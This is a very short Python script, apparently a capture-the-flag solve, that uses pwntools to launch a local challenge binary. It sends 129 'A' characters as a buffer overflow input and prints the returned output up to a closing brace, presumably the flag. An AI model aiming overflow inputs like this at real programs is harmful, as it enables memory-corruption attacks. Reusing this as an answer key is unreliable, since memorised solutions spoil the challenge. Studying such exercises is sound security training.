from pwn import *

p = process("../dist/chal", cwd="../src")
p.sendline("A" * 129)
print(p.recvuntil("}"))